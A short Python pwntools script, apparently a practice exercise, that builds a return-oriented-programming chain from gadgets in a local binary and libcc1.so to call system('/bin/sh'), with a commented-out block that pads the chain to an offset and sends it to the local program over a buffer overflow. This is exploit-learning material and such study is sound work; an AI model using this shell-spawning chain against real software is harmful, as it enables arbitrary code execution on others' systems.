#!/usr/bin/env python3

from pwn import *

# # Override pwntools's default cache directory to your secret tmp directory
# # (workaround for <https://github.com/Gallopsled/pwntools/issues/2072>)
# os.environ['XDG_CACHE_HOME'] = './'

# Our ROP chain will use gadgets from the following ELFs
rop = ROP([ELF('./example'),
           ELF('/usr/lib/gcc/x86_64-linux-gnu/12/libcc1.so')])

# Write a ROP chain that calls some libc functions!
rop.call('system', ['/bin/sh'])
rop.call('exit', [0])

# Pretty-print the finished payload
print(rop.dump())

# Convert it to bytes
payload = rop.chain()
print(payload)

#  from itertools import cycle
#  from pwn import *

#  binary = ELF('./example')

#  # print(binary.sym)

#  rop = ROP(binary)
#  rop.foo()
#  rop.exit()

#  print(rop.dump())
#  print("Binary Data:")
#  print(hexdump(bytes(rop)))
#  ropchain = rop.chain()

#  offset = 30
#  payload = flat({offset: ropchain}, filler=cycle(b'A'))

#  print(f"{payload=}")

#  #  buffer_size = 10
#  #  padding = str(0xaa) * buffer_size

#  #  payload = padding.encode() + ropchain

#  print('exploiting...')

#  with process(binary.path) as example:
#  example.sendline(payload)
#  print(example.recvline(timeout=5))


#  #  #  print(binary.symbols['foo'])
#  #  #  print(binary.symbols)



